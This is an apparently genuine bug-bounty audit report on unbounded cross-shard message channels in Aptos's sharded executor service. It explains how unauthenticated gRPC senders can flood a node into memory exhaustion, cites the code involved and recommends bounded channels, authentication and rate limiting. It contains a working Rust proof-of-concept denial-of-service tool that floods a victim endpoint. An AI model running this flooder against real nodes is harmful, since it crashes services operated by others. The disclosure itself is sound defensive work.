# Audit Report

## Title
Unbounded Cross-Shard Message Channels Enable Memory Exhaustion DoS Attack on Executor Shards

## Summary
The `RemoteCrossShardClient::new()` function creates unbounded channels for cross-shard communication, allowing Byzantine shards or external attackers to flood victim nodes with messages, causing memory exhaustion and node crashes. With no rate limiting, authentication, or backpressure mechanisms, each shard is vulnerable to DoS attacks through its 8 inbound channels.

## Finding Description

The remote executor service implements cross-shard communication using unbounded `crossbeam_channel` channels without any protective mechanisms. This breaks the **Resource Limits** invariant (#9: "All operations must respect gas, storage, and computational limits").

**Vulnerability Chain:**

1. **Unbounded Channel Creation**: In `RemoteCrossShardClient::new()`, channels are created via `NetworkController::create_inbound_channel()` and `create_outbound_channel()`, both of which use `unbounded()` from crossbeam_channel. [1](#0-0) [2](#0-1) 

2. **Multiple Channels Per Node**: For each remote shard address, 8 channels are created (one per `MAX_ALLOWED_PARTITIONING_ROUNDS`), multiplying the attack surface. [3](#0-2) [4](#0-3) [5](#0-4) 

3. **No Authentication**: The GRPC service accepts messages from any sender without authentication or validation of the sender's identity. Messages are directly forwarded to handler channels. [6](#0-5) 

4. **No Rate Limiting**: No rate limiting exists in the inbound handler or GRPC service. Messages are immediately pushed to channels. [7](#0-6) 

5. **Large Message Size**: Each message can be up to 80MB (`MAX_MESSAGE_SIZE`), amplifying memory consumption. [8](#0-7) 

**Attack Scenario:**

A Byzantine shard (or attacker impersonating one) sends continuous `CrossShardMsg` messages to a victim shard's GRPC endpoint. The messages are deserialized and pushed to the unbounded inbound channels. Since channels have no capacity limit, they grow indefinitely if messages arrive faster than they're processed. With 8 channels per node and 80MB per message, memory exhaustion occurs rapidly.

The attack requires:
- Network access to the victim's GRPC endpoint (exposed via command-line arguments)
- Knowledge of message_type format: `"cross_shard_{round}"` where round ∈ [0,7]
- Ability to craft `CrossShardMsg` structures (containing `RemoteTxnWrite` or `StopMsg`) [9](#0-8) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program for the following reasons:

1. **Validator Node Slowdowns**: As memory fills, the node experiences severe performance degradation due to swapping and GC pressure, slowing block execution and consensus participation.

2. **API Crashes**: When memory exhaustion reaches the OOM threshold, the executor service process crashes, causing total loss of that shard's execution capability.

3. **Significant Protocol Violations**: The sharded executor design assumes reliable cross-shard communication. Memory exhaustion breaks this assumption, potentially causing:
   - Deadlocks when receiving shards wait for messages that never arrive (victim shard crashed)
   - Incomplete block execution requiring coordinator intervention
   - Cascading failures if multiple shards are targeted

The impact is magnified by:
- **Multiple attack vectors**: With N shards, there are 8N total channels vulnerable to flooding
- **Amplification**: 80MB max message size enables rapid memory consumption
- **No recovery mechanism**: Once channels are flooded, the backlog must be processed or the node restarted

## Likelihood Explanation

**Likelihood: Medium-High**

**Exploitation Ease:**
- **Low barrier to entry**: No authentication required; attacker only needs network access
- **Simple attack**: Flood GRPC endpoint with messages—no complex timing or state manipulation needed
- **Low resources**: Single attacking machine can saturate victim channels

**Enabling Factors:**
- Executor service addresses are passed via command-line arguments and may be discoverable
- Message format is straightforward (BCS-serialized `CrossShardMsg`)
- No monitoring/alerting for channel depth or memory growth in the provided code

**Mitigating Factors:**
- Requires network-level access to the GRPC endpoint (may be firewalled in production)
- Sharded execution is currently experimental ("benchmark purpose right now" per code comments)
- Attack is detectable via standard monitoring (memory usage spikes) [10](#0-9) 

## Recommendation

**Immediate Fixes:**

1. **Use Bounded Channels**: Replace `unbounded()` with `bounded(capacity)` in channel creation. Recommended capacity: 1000-10000 messages per channel depending on expected cross-shard communication volume.

```rust
// In secure/net/src/network_controller/mod.rs
pub fn create_outbound_channel(
    &mut self,
    remote_peer_addr: SocketAddr,
    message_type: String,
) -> Sender<Message> {
    const CHANNEL_CAPACITY: usize = 1000; // Configure appropriately
    let (outbound_sender, outbound_receiver) = bounded(CHANNEL_CAPACITY);
    // ... rest of function
}

pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    const CHANNEL_CAPACITY: usize = 1000;
    let (inbound_sender, inbound_receiver) = bounded(CHANNEL_CAPACITY);
    // ... rest of function
}
```

2. **Implement Backpressure**: When channels are full, `send()` operations will block or fail, providing natural backpressure to prevent memory exhaustion.

3. **Add Authentication**: Implement mutual TLS or other authentication for cross-shard communication to ensure only legitimate shards can send messages.

4. **Rate Limiting**: Add per-sender rate limiting in the GRPC service handler:

```rust
// In grpc_network_service/mod.rs - add rate limiter
use governor::{Quota, RateLimiter};

impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(&self, request: Request<NetworkMessage>) 
        -> Result<Response<Empty>, Status> {
        let remote_addr = request.remote_addr();
        
        // Check rate limit per sender
        if !self.rate_limiter.check(remote_addr) {
            return Err(Status::resource_exhausted("Rate limit exceeded"));
        }
        
        // ... rest of handler
    }
}
```

5. **Message Size Validation**: While `MAX_MESSAGE_SIZE` exists, add application-level validation of `CrossShardMsg` content to prevent abuse.

6. **Monitoring**: Add metrics for channel depth and memory usage with alerting.

## Proof of Concept

```rust
// PoC demonstrating channel flooding attack
// Compile: cargo build --bin cross_shard_flood_poc
// Run: ./target/debug/cross_shard_flood_poc --victim-addr 127.0.0.1:50051

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_types::block_executor::partitioner::MAX_ALLOWED_PARTITIONING_ROUNDS;
use clap::Parser;
use std::net::SocketAddr;
use tokio::time::{interval, Duration};

#[derive(Parser)]
struct Args {
    #[clap(long)]
    victim_addr: SocketAddr,
    
    #[clap(long, default_value = "10000")]
    messages_per_second: u64,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    
    println!("[*] Starting memory exhaustion attack on {}", args.victim_addr);
    println!("[*] Target: {} messages/second across {} channels", 
        args.messages_per_second, MAX_ALLOWED_PARTITIONING_ROUNDS);
    
    // Create GRPC client
    let channel = tonic::transport::Endpoint::new(format!("http://{}", args.victim_addr))?
        .connect()
        .await?;
    let mut client = NetworkMessageServiceClient::new(channel)
        .max_decoding_message_size(1024 * 1024 * 80);
    
    // Create large payload (1MB per message for faster exhaustion)
    let large_payload = vec![0u8; 1024 * 1024];
    
    // Flood all 8 cross-shard channels
    let mut interval = interval(Duration::from_micros(
        1_000_000 / args.messages_per_second
    ));
    
    let mut msg_count = 0u64;
    loop {
        interval.tick().await;
        
        // Rotate through all rounds to flood all channels
        let round = msg_count % MAX_ALLOWED_PARTITIONING_ROUNDS as u64;
        let message_type = format!("cross_shard_{}", round);
        
        // Create malicious CrossShardMsg (serialized as BCS)
        // In practice, would serialize RemoteTxnWrite with fake state keys
        let request = tonic::Request::new(NetworkMessage {
            message: large_payload.clone(),
            message_type,
        });
        
        match client.simple_msg_exchange(request).await {
            Ok(_) => {
                msg_count += 1;
                if msg_count % 1000 == 0 {
                    println!("[+] Sent {} messages ({:.2} GB queued)", 
                        msg_count, 
                        (msg_count as f64 * large_payload.len() as f64) / (1024.0 * 1024.0 * 1024.0)
                    );
                }
            },
            Err(e) => {
                println!("[-] Error (victim may be down): {}", e);
                break;
            }
        }
    }
    
    Ok(())
}
```

**Expected Result**: Within minutes (depending on victim node's available memory), the victim executor shard will experience:
1. Rapid memory growth (observable via `htop` or similar)
2. Performance degradation (increased latency, CPU usage from GC)
3. OOM killer termination or process crash
4. Complete loss of shard execution capability

**Notes on PoC**:
- This demonstrates the attack vector without requiring actual cross-shard dependency setup
- Real attack would use properly serialized `CrossShardMsg` structures with `RemoteTxnWrite` payloads
- Attack can be distributed across multiple attacking machines for faster exhaustion
- Bounded channels with backpressure would cause the `simple_msg_exchange` call to fail or block, preventing the attack

### Citations

**File:** secure/net/src/network_controller/mod.rs (L120-120)
```rust
        let (outbound_sender, outbound_receiver) = unbounded();
```

**File:** secure/net/src/network_controller/mod.rs (L129-129)
```rust
        let (inbound_sender, inbound_receiver) = unbounded();
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L26-34)
```rust
        for remote_address in shard_addresses.iter() {
            let mut txs = vec![];
            for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
                let message_type = format!("cross_shard_{}", round);
                let tx = controller.create_outbound_channel(*remote_address, message_type);
                txs.push(Mutex::new(tx));
            }
            message_txs.push(txs);
        }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L36-41)
```rust
        // Create inbound channels for each round
        for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
            let message_type = format!("cross_shard_{}", round);
            let rx = controller.create_inbound_channel(message_type);
            message_rxs.push(Mutex::new(rx));
        }
```

**File:** types/src/block_executor/partitioner.rs (L20-20)
```rust
pub static MAX_ALLOWED_PARTITIONING_ROUNDS: usize = 8;
```

**File:** types/src/block_executor/partitioner.rs (L449-454)
```rust
            ExecutableTransactions::Sharded(_) => {
                // Not supporting auxiliary info here because the sharded executor is only for
                // benchmark purpose right now.
                // TODO: Revisit when we need it.
                assert!(auxiliary_info.is_empty());
            },
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/inbound_handler.rs (L66-74)
```rust
    pub fn send_incoming_message_to_handler(&self, message_type: &MessageType, message: Message) {
        // Check if there is a registered handler for the sender
        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(message_type) {
            // Send the message to the registered handler
            handler.send(message).unwrap();
        } else {
            warn!("No handler registered for message type: {:?}", message_type);
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L7-18)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteTxnWrite {
    state_key: StateKey,
    // The write op is None if the transaction is aborted.
    write_op: Option<WriteOp>,
}
```
